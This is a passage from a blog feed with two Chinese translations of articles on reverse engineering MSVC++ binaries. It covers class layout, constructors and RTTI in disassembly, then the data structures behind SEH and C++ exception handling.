class="built_in">eax</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [this+<span class="number">60h</span>], offset const CEventSinkList::<span class="string">'vftable'</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, this</div><div class="line">    <span class="keyword">pop</span>     this</div><div class="line">    <span class="keyword">retn</span></div><div class="line">sub_52B5E0      endp</div></pre></td></tr></table></figure>
<p>编译器在<strong>预言</strong>(<code>prolog</code>) 之后要做的第一件事就是把 <code>_this_</code> 指针的值从 <code>ecx</code> 拷贝到 <code>esi</code>，继而后续所有的寻址都是相对于 <code>esi</code> 作为基址。在初始化<strong>虚函数表指针</strong>(<code>vfptrs</code>) 之前调用了两个其他函数，这一定是<strong>基类的构造函数</strong>——本例中即 <code>CDownloader</code> 和 <code>CNativeEventSource</code> 的构造函数。进一步深入函数跟踪分析可以帮助我们确认这一点：第一个<strong>虚函数表指针</strong>（ <code>vfptf</code> ）用 <code>CDownloader::&#39;vftable&#39;</code> 来初始化， 第二个<strong>虚函数表指针</strong>用 <code>CNativeEventSource::&#39;vftable&#39;</code> 来初始化。我们也可以进一步检查 <code>CDownloader</code> 的<strong>构造函数</strong> —— 它调用了其<strong>基类</strong> <code>CNativeEventSink</code> 的构造函数。</p>
<p>类似的，<code>_this_</code> 指针的值通过 <code>edi</code> 传入，这时它被重置为 <code>_this_ + 24h</code> ，根据我们上面的类结构图来看，这是 <code>CNativeEventSource</code> 子对象的位置。这是另一个证明被调用的第二个函数是 <code>CNativeEventSource</code> 的构造函数的证据。</p>
<p>结束了基类的构造函数调用过程之后，<strong>基类</strong>中的<strong>虚函数指针</strong>被 <code>CContentMenuItem</code> 中自己的实现所覆盖，即 <code>CContentMenuItem</code> 实现了基类中的部分<strong>虚函数</strong>（或者增加了自己的<strong>虚函数</strong>）。有必要的话，我们可以对比这些表、检查那些指针被修改过或被添加了——新添加的指针就是 <code>CContentMenuItem</code> 中新实现的虚函数。</p>
<p>接下来我们就看到几个对地址 <code>.04D8000</code> 的调用，调用之前 <code>ecx</code> 的值被设置为 <code>this+4Ch</code> 到 <code>this+5Ch</code> —— 这很明显是在初始化成员对象。一个问题是，我们如何分辨初始化函数是编译器自动生成的构造函数，还是程序员编写的自定义构造函数呢？这里有两个关键点可以参考：</p>
<ul>
<li>函数使用 <code>_thiscall_</code> 的 <strong>调用约定</strong>，而且是第一次访问这些字段；</li>
<li>字段的初始化顺序是按照地址增长的方向进行的。</li>
</ul>
<p>为了确定这些点，我们可以查看<strong>析构函数</strong>中的<strong>栈展开处理函数</strong>（Unwind Funclets），在那里我们可以看到编译器为这些成员变量生成的构造函数。</p>
<p>这个新的类并没有<strong>虚函数</strong>，因此也没有 <strong>RTTI</strong>，所以我们也不知道它的名字，不妨先命名为  RefCountedPtr<code>。根据前面的分析，位于</code>.4D8000<code>的函数是**构造函数**，那么在</code>CContentMenuItem<code>我们可以看到析构函数中的**栈展开处理函数**——在</code>.63CCB4` 处。</p>
<p>回过头去看 <code>CContentMenuItem</code> 的 <strong>构造函数</strong>，可以看到 3 个字段初始化为 0，另外一个初始化为一个 <strong>虚函数表指针</strong>（ <code>vftable pointer</code> ）。这个看起来想一个成员变量的内联构造函数（不是<strong>基类</strong>，因为<strong>基类</strong>会出现在继承关系树中）。从一个使用了的虚函数表的 RTTI 中我们可以看出这是一个 <code>CEventSinkList</code> 模板的实例。</p>
<p>根据上面的分析，我们可以大概勾勒出类的结构声明：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> CContentMenuItem: <span class="keyword">public</span> CDownloader, <span class="keyword">public</span> CNativeEventSource</div><div class="line">&#123;</div><div class="line"><span class="comment">/* 00 CDownloader */</span></div><div class="line"><span class="comment">/* 24 CNativeEventSource */</span></div><div class="line"><span class="comment">/* 48 */</span> DWORD m_unknown48;</div><div class="line"><span class="comment">/* 4C */</span> RefCountedPtr m_ptr4C;</div><div class="line"><span class="comment">/* 50 */</span> RefCountedPtr m_ptr50;</div><div class="line"><span class="comment">/* 54 */</span> RefCountedPtr m_ptr54;</div><div class="line"><span class="comment">/* 58 */</span> RefCountedPtr m_ptr58;</div><div class="line"><span class="comment">/* 5C */</span> RefCountedPtr m_ptr5C;</div><div class="line"><span class="comment">/* 60 */</span> CEventSinkList m_EventSinkList;</div><div class="line"><span class="comment">/* size = 70? */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我们不确定偏移为 <code>0x48</code> 处的变量是否为 <code>CNativeEventSource</code> 的一部分，但由于它并没有被 <code>CNativeEventSource</code> 的构造函数访问到，那么它很可能属于 <code>CContentMenuItem</code>。包含被重命名函数的构造函数与类的结构如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">public:</span> __thiscall CContentMenuItem::CContentMenuItem(void) proc <span class="built_in">near</span></div><div class="line">    <span class="keyword">push</span>    this</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     this, <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">call</span>    CDownloader::CDownloader(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">edi</span>, [this+CContentMenuItem._CNativeEventSource]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">edi</span></div><div class="line">    <span class="keyword">call</span>    CNativeEventSource::CNativeEventSource(void)</div><div class="line">    <span class="keyword">or</span>      [this+CContentMenuItem.m_unknown48], -<span class="number">1</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr4C]</div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem._CDownloader._vfptr], offset const CContentMenuItem::<span class="string">'vftable'</span>&#123;for <span class="string">'CContentMenuItem'</span>&#125;</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">edi</span>+CNativeEventSource._vfptr], offset const CContentMenuItem::<span class="string">'vftable'</span>&#123;for <span class="string">'CNativeEventSource'</span>&#125;</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr50]</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr54]</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr58]</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+CContentMenuItem.m_ptr5C]</div><div class="line">    <span class="keyword">call</span>    RefCountedPtr::RefCountedPtr(void)</div><div class="line">    <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem.m_EventSinkList.field_4], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem.m_EventSinkList.field_8], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem.m_EventSinkList.field_C], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     [this+CContentMenuItem.m_EventSinkList._vfptr], offset const CEventSinkList::<span class="string">'vftable'</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, this</div><div class="line">    <span class="keyword">pop</span>     this</div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol">public:</span> __thiscall CContentMenuItem::CContentMenuItem(void) endp</div></pre></td></tr></table></figure>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ol>
<li><a href="http://msdn.microsoft.com/archive/default.asp?url=/archive/en-us/dnarvc/html/jangrayhood.asp" target="_blank" rel="external">http://msdn.microsoft.com/archive/default.asp?url=/archive/en-us/dnarvc/html/jangrayhood.asp</a></li>
<li><a href="http://www.lrdev.com/lr/c/virtual.html" target="_blank" rel="external">http://www.lrdev.com/lr/c/virtual.html</a></li>
<li><p>微软关于 C++ 各部分实现的专利材料：</p>
<ul>
<li><a href="http://freepatentsonline.com/5410705.html" target="_blank" rel="external">http://freepatentsonline.com/5410705.html</a></li>
<li><a href="http://freepatentsonline.com/5617569.html" target="_blank" rel="external">http://freepatentsonline.com/5617569.html</a></li>
<li><a href="http://freepatentsonline.com/5754862.html" target="_blank" rel="external">http://freepatentsonline.com/5754862.html</a></li>
<li><a href="http://freepatentsonline.com/5297284.html" target="_blank" rel="external">http://freepatentsonline.com/5297284.html</a></li>
<li><a href="http://freepatentsonline.com/5371891.html" target="_blank" rel="external">http://freepatentsonline.com/5371891.html</a></li>
<li><a href="http://freepatentsonline.com/5603030.html" target="_blank" rel="external">http://freepatentsonline.com/5603030.html</a></li>
<li><a href="http://freepatentsonline.com/6138269.html" target="_blank" rel="external">http://freepatentsonline.com/6138269.html</a></li>
</ul>
</li>
<li><p><a href="http://members.ozemail.com.au/~geoffch@ozemail.com.au/samples/programming/msvc/language/predefined/index.html" target="_blank" rel="external">http://members.ozemail.com.au/~geoffch@ozemail.com.au/samples/programming/msvc/language/predefined/index.html</a></p>
</li>
<li><a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/vclang/html/_predir_init_seg.asp" target="_blank" rel="external">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/vclang/html/_predir_init_seg.asp</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文： &lt;a href=&quot;http://www.openrce.org/articles/full_view/23&quot;&gt;http://www.openrce.org/articles/full_view/23&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是本系列第二篇（第一篇 👉： &lt;a href=&quot;http://jiayu0x.com/2017/04/25/reversing-msvcxx-exception-handling/&quot;&gt;MSVC++ 逆向(1)——异常处理&lt;/a&gt; ），本篇将介绍 MSVC 中实现的 C++ 底层机制，包括逆向过程中的 &lt;strong&gt;类结构内存布局&lt;/strong&gt;、&lt;strong&gt;虚函数&lt;/strong&gt;、&lt;strong&gt;RTTI&lt;/strong&gt;（&lt;strong&gt;Run-Time Type Information&lt;/strong&gt;，运行时类型识别）。阅读本文需要有 C++ 基础知识以及汇编和逆向相关基础。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="c++" scheme="http://jiayu0x.com/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>(译)MSVC++ 逆向(一) —— 异常处理</title>
    <link href="http://jiayu0x.com/2017/04/25/reversing-msvcxx-exception-handling/"/>
    <id>http://jiayu0x.com/2017/04/25/reversing-msvcxx-exception-handling/</id>
    <published>2017-04-24T16:00:00.000Z</published>
    <updated>2017-05-04T13:44:04.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>原文： <a href="http://www.openrce.org/articles/full_view/21" target="_blank" rel="external">http://www.openrce.org/articles/full_view/21</a>  </p>
</blockquote>
<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>MSVC++</strong> 是编写 Win32 应用程序最常用的编译器，所以在 Win32 平台的逆向工作中，懂得其底层工作原理，对逆向工程师来说至关重要。掌握 VC++ 程序的底层原理之后，便能在逆向过程中精准、快速识别编译器生成的<strong>胶水代码</strong>（Glue Code），这样可以让逆向工程师快速聚焦于二进制文件背后的真实程序和真实逻辑。另外，这对还原程序中高层次的结构（<strong><code>译注</code></strong>：面向对象的数据结构和程序组织结构、异常相关数据结构等）也有莫大帮助。  </p>
<p>本文只是系列文章的上半部分（下半部分见： <a href="http://jiayu0x.com/2017/04/30/reversing-msvcxx-exception-handling-2/">(译)MSVC++ 逆向（二）—— 类、方法和 RTTI</a>），主要讲栈展开、异常处理以及 MSVC 编译生成相关的数据结构。阅读本文需要有汇编、寄存器和调用约定相关的知识储备，当然，MSVC++ 的编程基础知识也是必要的。  </p>
<a id="more"></a>
<p><strong>名词解释</strong>：</p>
<blockquote>
<ul>
<li><strong>栈帧（Stack Frame）</strong>：<strong>栈</strong> 中为<strong>函数</strong>所用的一个 <strong>片段</strong>，里面通常包含函数相关的<strong>参数</strong>（Arguments）、<strong>返回地址</strong>（Return-to-Caller Address）、<strong>保存的寄存器状态</strong>、<strong>本地变量</strong>（Local Variables）和一些其他的数据。在 <strong>x86</strong> 架构（以及其他多数架构）中，栈里调用和被调用的函数，栈帧通常是连续的；</li>
<li><strong>帧指针（Frame Pointer）</strong>：一个指向栈中特定<strong>位置</strong>的指针，指针值通常保存在寄存器或某个变量中。访问函数中的数据，一般通过帧指针和特定<strong>偏移量</strong>来实现。在 <strong>x86</strong> 架构里，<strong>帧指针</strong>通常保存在寄存器 <strong><code>ebp</code></strong>中，并且，在栈布局结构中位于<strong>返回地址</strong>的下方；</li>
<li><strong>对象（Object）</strong>：C++ 类的实例；</li>
<li><strong>可销毁对象（Unwindable Object）</strong>：又叫<strong>局部对象</strong>，一个具有 <code>auto</code> 作用域的本地对象，当帧指针访问其作用域之外的位置时该对象会被销毁（<strong><code>译注</code></strong>：函数内部本地变量的默认作用域就是 <code>auto</code>，函数被调用的时候其内部变量及其他数据被生成到栈上，调用完毕就会销毁这段栈的片段，其内部变量也就随之被销毁）；</li>
<li><strong>栈展开（Stack Unwinding）</strong>：触发异常的时候，将暂停当前函数的执行，根据 <code>C++</code> 的 <code>try/throw/catch</code> 异常处理流程或 <code>SEH</code> 异常处理机制，会在栈段中线性搜索对应的异常处理函数，如果当前栈帧中没有相应的异常处理模块，就会退出当前函数，释放当前函数的内存并销毁局部对象，继续到上层调用函数中寻找对应的异常处理模块，直到找到可以处理该异常的模块……这个过程就是<strong>栈展开</strong>。</li>
</ul>
</blockquote>
<p>在 C/C++ 程序中，可用的异常处理机制有两种：</p>
<blockquote>
<ul>
<li><strong>SEH 异常</strong>：即<strong>结构化异常处理</strong>(Structured Exception Handling)，也称作 <strong>Win32 异常</strong> 或 <strong>系统异常</strong>，这部分内容在 <strong>Matt Pietrek</strong> 的 Paper[1] 里有详尽的讲解。该机制是 C 程序仅有的异常处理机制，在编译器层面支持的关键字有 <code>__try</code>/<code>__except</code>/<code>finally</code> 等等；</li>
<li><strong>C++ 异常</strong>：实现于 SEH 链的顶层，并且支持任意类型的 <code>throw</code> 和 <code>catch</code>。该异常处理机制一个非常重要的特性是在异常处理过程中的自动栈展开，MSVC++ 为了支持这一特性，在底层做了非常复杂的处理。</li>
</ul>
<p><strong><code>译注</code></strong>：<br>根据 <a href="https://msdn.microsoft.com/zh-cn/library/x057540h.aspx" target="_blank" rel="external">VC++ 中的异常处理 | MSDN</a> 所述，自 <code>MFC3.0</code> 起，MFC 程序中可以使用 MFC 特有的异常处理机制——<strong>MFC 异常</strong>。</p>
</blockquote>
<p>内存中，栈是由高地址向低地址方向增长的，所以在 IDA 中看到的栈，是<strong>向上增长</strong>的。</p>
<h2 id="栈的内存布局"><a href="#栈的内存布局" class="headerlink" title="栈的内存布局"></a>栈的内存布局</h2><p>基础的栈布局如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">---------------</div><div class="line">局部变量</div><div class="line">---------------</div><div class="line">其它寄存器的值</div><div class="line">---------------</div><div class="line">原栈基址 %ebp</div><div class="line">---------------</div><div class="line">返回地址</div><div class="line">---------------</div><div class="line">函数参数</div><div class="line">---------------</div><div class="line">……</div></pre></td></tr></table></figure>
<p>具体点，如下图所示：<br><img src="/imgs/14931296110235.jpg" alt="基础栈内存布局"></p>
<blockquote>
<p><strong>NOTE</strong>:<br>如果设置了 <strong><code>FPO</code></strong>（Frame Pointer Omission， 框架指针省略），<code>原栈基址 %ebp</code> 可能就不存在了。</p>
</blockquote>
<h2 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h2><p>当涉及到编译器层面的 <strong>SEH</strong>（<code>__try/__except/__finally</code>） 时，栈的内存布局就会变的复杂一些：<br><img src="/imgs/14931296634632.jpg" alt="SEH3 站内存布局"></p>
<p>一个函数中如果没有 <code>__try</code> 语句块（只有 <code>__finally</code>），<code>Saved ESP</code> 就不会存在。另外，<strong>作用域描述表</strong>（ <code>scopetable</code> ）是一个记录每一个 <code>try</code> 块及其关系描述的数组：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> _SCOPETABLE_ENTRY &#123;</div><div class="line">    DWORD EnclosingLevel;</div><div class="line">    <span class="keyword">void</span>* FilterFunc;</div><div class="line">    <span class="keyword">void</span>* HandlerFunc;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>更多 SEH 具体的实现细节可以查阅参考资料[1]。为了恢复 <code>try</code> 语句块，需要监控 <code>try</code> 层面的变量变化。 SEH 为每一个 <code>try</code> 语句块分配了一个编号，语句块之间的相互联系用上面的 <code>scopetable</code> 结构体来描述。举个栗子，假设编号为 <code>i</code> 的 <code>scopetable</code> ，其中属性 <code>EnclosingLevel</code> 值为 <code>j</code>，那么编号为  <code>j</code> 的 <code>try</code> 语句块会把 <code>i</code> 闭合在自己的作用域内。然后该函数的 <code>try level</code> 可以认为是 <code>-1</code> 。具体例子可以参考<strong>附录1</strong>。</p>
<h2 id="栈越界（溢出）保护"><a href="#栈越界（溢出）保护" class="headerlink" title="栈越界（溢出）保护"></a>栈越界（溢出）保护</h2><p><code>Whidbey</code> 编译器（即 <strong>MSVC-2005</strong>）为栈中的 SEH 帧添加了缓冲区溢出保护机制，如此一来，栈内存布局就变成了下图这样：<br><img src="/imgs/14931297820310.jpg" alt="SEH4 栈内存布局"></p>
<p><code>EH Cookie</code> 会一直存在，而 <code>GS cookie</code> 段只有在编译时开启了 <code>/GS</code> 选项才会出现。<code>SEH4</code> 的作用域描述表（ <code>scopetable</code> ）跟 <code>SEH3</code> 的差不多，不同的是多了以下两组头部字段：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> _EH4_SCOPETABLE &#123;</div><div class="line">    DWORD GSCookieOffset;</div><div class="line">    DWORD GSCookieXOROffset;</div><div class="line">    DWORD EHCookieOffset;</div><div class="line">    DWORD EHCookieXOROffset;</div><div class="line">    _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> _EH4_SCOPETABLE_RECORD &#123;</div><div class="line">    DWORD EnclosingLevel;</div><div class="line">    <span class="keyword">long</span> (*FilterFunc)();</div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        <span class="keyword">void</span> (*HandlerAddress)();</div><div class="line">        <span class="keyword">void</span> (*FinallyFunc)();</div><div class="line">    &#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>GSCookieOffset = -2</code> 表示没有启用 <code>GS cookie</code> ，<code>EH cookie</code> 会一直启用，并且访问时用到的偏移都是相对于 <code>%ebp</code> 来计算的。对 <code>security_cookie</code> 的校验方式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(ebp+CookieXOROffset) ^ [ebp+CookieOffset] == _security_cookie</div></pre></td></tr></table></figure>
<p>栈中指向 <code>scopetable</code> 的指针也要与 <code>_security_cookie</code> 进行异或计算。另外，<code>SEH4</code> 中最外层的作用域层级（<code>scope level</code>）是 <code>-2</code> ，而不是像 <code>SEH3</code> 中那样的 <code>-1</code>。</p>
<h2 id="C-异常模型实现"><a href="#C-异常模型实现" class="headerlink" title="C++ 异常模型实现"></a>C++ 异常模型实现</h2><p>如果函数中实现了 C++ 的异常处理，或者可销毁的<strong>局部对象</strong>，栈的内存布局就会变得更加复杂起来：<br><img src="/imgs/14931309060247.jpg" alt="C++ 异常n内存布局"></p>
<p>不同于 SEH，C++ 每一个函数中的异常处理内存布局都不相同，通常是如下形式：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">// (VC7+)</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, OFFSET __ehfuncinfo</div><div class="line"><span class="keyword">jmp</span> ___CxxFrameHandler</div></pre></td></tr></table></figure>
<p>其中，<code>__ehfuncinfo</code> 是一个 <code>FuncInfo</code> 结构对象，该结构中囊括了函数中所有的 <code>try/catch</code> 块的描述以及可销毁对象信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> FuncInfo &#123;</div><div class="line">    <span class="comment">// 编译器版本</span></div><div class="line">    <span class="comment">// 0x19930520: 低于 VC6； 0x19930521: VC7.x(2002-2003)；0x19930522: VC8 (2005)</span></div><div class="line">    DWORD magicNumber;</div><div class="line"></div><div class="line">    <span class="comment">// 栈展开描述表中的入口数量</span></div><div class="line">    <span class="comment">// number of entries in unwind table</span></div><div class="line">    <span class="keyword">int</span> maxState;</div><div class="line"></div><div class="line">    <span class="comment">// 栈展开处理方法绑定表</span></div><div class="line">    <span class="comment">// table of unwind destructors</span></div><div class="line">    UnwindMapEntry* pUnwindMap;</div><div class="line"></div><div class="line">    <span class="comment">// 函数中的 try 语句块数量</span></div><div class="line">    DWORD nTryBlocks;</div><div class="line"></div><div class="line">    <span class="comment">// try-catch 映射表</span></div><div class="line">    <span class="comment">// mapping of catch blocks to try blocks</span></div><div class="line">    TryBlockMapEntry* pTryBlockMap;</div><div class="line"></div><div class="line">    <span class="comment">// x86 架构上不可用</span></div><div class="line">    <span class="comment">// not used on x86</span></div><div class="line">    DWORD nIPMapEntries;</div><div class="line"></div><div class="line">    <span class="comment">// not used on x86</span></div><div class="line">    <span class="keyword">void</span>* pIPtoStateMap;</div><div class="line"></div><div class="line">    <span class="comment">// VC7 及以上版本可用，期望异常列表</span></div><div class="line">    <span class="comment">// VC7+ only, expected exceptions list (function "throw" specifier)</span></div><div class="line">    ESTypeList* pESTypeList;</div><div class="line"></div><div class="line">    <span class="comment">// VC8 及以上版本可用，但以 /EHs 选项编译时会置 零</span></div><div class="line">    <span class="comment">// VC8+ only, bit 0 set if function was compiled with /EHs</span></div><div class="line">    <span class="keyword">int</span> EHFlags;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>栈展开映射（<code>Unwind map</code>）类似 SEH 作用域描述表（<code>SEH scopetable</code>），只是少了过滤函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> UnwindMapEntry &#123;</div><div class="line">    <span class="keyword">int</span> toState;        <span class="comment">// target state</span></div><div class="line">    <span class="keyword">void</span> (*action)();   <span class="comment">// 栈展开时调用的处理函数</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>try</code> 语句块描述结构体，描述一个 <code>try{}</code> 块对应的 <code>catch{}</code> 块的映射信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> TryBlockMapEntry &#123;</div><div class="line">    <span class="keyword">int</span> tryLow;</div><div class="line">    <span class="keyword">int</span> tryHigh;    <span class="comment">// this try &#123;&#125; covers states ranging from tryLow to tryHigh</span></div><div class="line">    <span class="keyword">int</span> catchHigh;  <span class="comment">// highest state inside catch handlers of this try</span></div><div class="line">    <span class="keyword">int</span> nCatches;   <span class="comment">// number of catch handlers</span></div><div class="line">    HandlerType* pHandlerArray; <span class="comment">//catch handlers table</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>catch</code> 语句块描述表，描述对应某个 <code>catch{}</code> 块的单个 <code>try{}</code> 块的相关信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> HandlerType &#123;</div><div class="line">    <span class="comment">// 0x01: const, 0x02: volatile, 0x08: reference</span></div><div class="line">    DWORD adjectives;</div><div class="line"></div><div class="line">    <span class="comment">// RTTI descriptor of the exception type. 0=any (ellipsis)</span></div><div class="line">    TypeDescriptor* pType;</div><div class="line"></div><div class="line">    <span class="comment">// ebp-based offset of the exception object in the function stack.</span></div><div class="line">    <span class="comment">// 0 = no object (catch by type)</span></div><div class="line">    <span class="keyword">int</span> dispCatchObj;</div><div class="line"></div><div class="line">    <span class="comment">// address of the catch handler code.</span></div><div class="line">    <span class="comment">// returns address where to continues execution (i.e. code after the try block)</span></div><div class="line">    <span class="keyword">void</span>* addressOfHandler;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>期望异常列表（MSVC 中默认关闭，需要用 <code>/d1ESrt</code> 编译选项开启）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> ESTypeList &#123;</div><div class="line">    <span class="comment">// number of entries in the list</span></div><div class="line">    <span class="keyword">int</span> nCount;</div><div class="line"></div><div class="line">    <span class="comment">// list of exceptions; it seems only pType field in HandlerType is used</span></div><div class="line">    HandlerType* pTypeArray;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>RTTI</code>（<strong>Run-Time Type Information</strong>，运行时类型识别）类型描述表，描述 C++ 中的类型信息，这里会用 <code>catch</code> 块中的类型去匹配 <code>throw</code> 出来的异常的类型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> TypeDescriptor &#123;</div><div class="line">    <span class="comment">// vtable of type_info class</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">void</span> * pVFTable;</div><div class="line"></div><div class="line">    <span class="comment">// used to keep the demangled name returned by type_info::name()</span></div><div class="line">    <span class="keyword">void</span>* spare;</div><div class="line"></div><div class="line">    <span class="comment">// mangled type name, e.g. ".H" = "int", ".?AUA@@" = "struct A", ".?AVA@@" = "class A"</span></div><div class="line">    <span class="keyword">char</span> name[<span class="number">0</span>];</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
